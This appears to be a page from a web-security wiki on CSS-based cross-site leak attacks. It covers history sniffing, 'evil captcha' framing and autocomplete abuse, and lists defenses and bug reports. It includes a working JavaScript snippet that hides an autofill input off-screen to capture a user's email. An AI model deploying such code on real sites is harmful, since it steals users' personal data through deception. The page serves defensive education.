+++
title = "CSS Tricks"
description = ""
date = "2020-10-01"
category = [
    "Attack"
]
abuse = [
    "CSS"
]
defenses = [
    "Framing Protections"
]
menu = "main"
weight = 2
+++

## CSS Tricks
CSS can be used to trick a user into exposing information such as embeded pixel values by making visual changes that are affected by the embed.

## Getting history
A PoC of this attack can be found [here](https://lcamtuf.coredump.cx/whack/).  
Because CSS has a [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) class it’s possible to apply a different style for URLs that have been visited.  
Previously it was possible to use [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) to detect this difference but now browsers prevent this. [source](https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector)  
So, it may be needed to trick the user into clicking an area that the CSS has affected this can be done using [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode). [source](https://lcamtuf.blogspot.com/2016/08/css-mix-blend-mode-is-bad-for-keeping.html)   
Render timings have also been abused to do this without tricking the user. [source](https://www.contextis.com/en/resources/white-papers/pixel-perfect-timing-attacks-with-html5)  

## Evil Captcha
Using CSS, it’s possible to take an embed out of context. [source](https://ronmasas.com/posts/the-human-side-channel)  
This can be prevented with XFO.

## Abusing autocomplete
If a website uses [autocomplete](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete) it may be possible to leak data such as email addresses.
This does require the user to be tricked into pressing the Up or Down arrow key then pressing Enter or Tab.
```javascript
let input = document.createElement("input");
input.type = "email";
input.autocomplete = "email";
input.name = "email";
input.size = "1";
input.style = "position:absolute;right:-500px;bottom:-21.9px";
input.onkeypress = e => {
    e.preventDefault();
}
window.onmousedown = e => {
    // ignore mouse clicks
    e.preventDefault();
}
input.onchange = e => {
    alert(e.srcElement.value);
    e.srcElement.value = "";
}
document.body.appendChild(input);
setInterval(() => {
    input.focus({preventScroll: true});
}, 1000);
```


## Defence
Some of the attacks can be prevented by using XFO,
The history attack can be prevented by disabling history or if on Firefox it’s possible to fix this by setting the `layout.css.visited_links_enabled` option in `about:config` to `false`.  
Bug reports for this attack can be found [here](https://bugs.chromium.org/p/chromium/issues/detail?id=712246) [here](https://bugs.chromium.org/p/chromium/issues/detail?id=713521) and [here](https://bugzilla.mozilla.org/show_bug.cgi?id=147777).

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                  [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                   |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------: |
|                                         ❌                                          |                          ❌                          |                                 ✔️                                 |  |
